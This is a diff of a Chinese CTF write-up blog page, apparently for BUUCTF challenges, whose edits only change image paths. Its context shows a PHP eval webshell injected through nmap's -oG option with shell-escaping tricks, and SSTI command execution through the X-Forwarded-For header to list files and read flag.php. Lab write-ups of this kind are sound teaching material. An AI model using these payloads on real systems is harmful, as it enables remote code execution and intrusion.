@@ -79,32 +79,32 @@
 <p>payload：<code>&#39;&lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG webshell.php &#39;</code></p>
 <p>经过两个过滤函数处理后：<code>&#39;\\&#39;&#39;\&lt;\?php @eval\(\$_POST\[&quot;hack&quot;\]\)\;\?\&gt; -oG webshell.php &#39;\\&#39;&#39;</code></p>
 <p>这样我们后台生成的文件名就是<code>webshell.php</code></p>
-<p><img src="/buuctf10.assets/image-20210720123151729.png"></p>
+<p><img src="/2021/07/20/buuctf10/image-20210720123151729.png"></p>
 <p>箭头指就是上传生成文件的文件夹的名称，用蚁剑直接连接我们的木马。</p>
 <p><strong>第二种：</strong>文件名和单引号之间没有空格</p>
 <p>payload：<code>&#39;&lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG webshell.php&#39;</code></p>
 <p>经过两个过滤函数处理后：<code>&#39;\\&#39;&#39;\&lt;\?php @eval\(\$_POST\[&quot;hack&quot;\]\)\;\?\&gt; -oG webshell.php&#39;\\&#39;&#39;</code></p>
 <p>这样后台生成的文件名就是<code>webshell.php\\</code>，就不能用蚁剑连接了</p>
 <h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>打开容器，发现是一个”很干净“的网页</p>
-<p><img src="/buuctf10.assets/image-20210720172626693.png" alt="image-20210720172626693"></p>
+<p><img src="/2021/07/20/buuctf10/image-20210720172626693.png" alt="image-20210720172626693"></p>
 <h4 id="一-探索"><a href="#一-探索" class="headerlink" title="一.探索"></a>一.探索</h4><p><strong>点击Flag</strong>进入页面：</p>
-<p><img src="/buuctf10.assets/image-20210720172709618.png" alt="image-20210720172709618"></p>
+<p><img src="/2021/07/20/buuctf10/image-20210720172709618.png" alt="image-20210720172709618"></p>
 <p>是我们的ip地址</p>
 <p>查看网页源码，没什么有用信息，看下一个网页</p>
 <p><strong>点击hint：</strong></p>
-<p><img src="/buuctf10.assets/image-20210720173148064.png" alt="image-20210720173148064"></p>
-<p>查看源码：<img src="/buuctf10.assets/image-20210720173339461.png" alt="image-20210720173339461"></p>
+<p><img src="/2021/07/20/buuctf10/image-20210720173148064.png" alt="image-20210720173148064"></p>
+<p>查看源码：<img src="/2021/07/20/buuctf10/image-20210720173339461.png" alt="image-20210720173339461"></p>
 <p>这个时候我们就想了他怎么知道我们的ip的，XFF吗还是client-ip，我们可不可以控制ip的值呢？</p>
 <h4 id="二-牛刀小试"><a href="#二-牛刀小试" class="headerlink" title="二.牛刀小试"></a>二.牛刀小试</h4><p>带着上面的疑惑，抓包，但是我发现原本并没有XFF或是client-ip，那我们加一个XFF</p>
-<p><img src="/buuctf10.assets/image-20210720173959441.png" alt="image-20210720173959441"></p>
-<p>我们可以看到他把我们的输入直接输出到了网页上。这里我们联想到SSTI中也是服务端把用户输入的内容渲染成模板，那么我们试一下是否存在SSTI注入<img src="/buuctf10.assets/image-20210720180432231.png" alt="image-20210720180432231"></p>
+<p><img src="/2021/07/20/buuctf10/image-20210720173959441.png" alt="image-20210720173959441"></p>
+<p>我们可以看到他把我们的输入直接输出到了网页上。这里我们联想到SSTI中也是服务端把用户输入的内容渲染成模板，那么我们试一下是否存在SSTI注入<img src="/2021/07/20/buuctf10/image-20210720180432231.png" alt="image-20210720180432231"></p>
 <p>可以看到服务器执行了我们的逻辑运算，SSTI石锤了</p>
 <h4 id="三-构造payload"><a href="#三-构造payload" class="headerlink" title="三.构造payload"></a>三.构造payload</h4><p><strong>payload：</strong>X-Forwarded-For: {system(‘ls’)}</p>
-<p><img src="/buuctf10.assets/image-20210720181052132.png" alt="image-20210720181052132"></p>
+<p><img src="/2021/07/20/buuctf10/image-20210720181052132.png" alt="image-20210720181052132"></p>
 <p><strong>payload：</strong>X-Forwarded-For: {system(‘cat flag.php’)}</p>
-<p><img src="/buuctf10.assets/image-20210720181225764.png" alt="image-20210720181225764"></p>
+<p><img src="/2021/07/20/buuctf10/image-20210720181225764.png" alt="image-20210720181225764"></p>
 <p>发现flag不在这里面，那按照经验来说一般会放在根目录</p>
-<p><img src="/buuctf10.assets/image-20210720181328126.png" alt="image-20210720181328126"></p>
+<p><img src="/2021/07/20/buuctf10/image-20210720181328126.png" alt="image-20210720181328126"></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
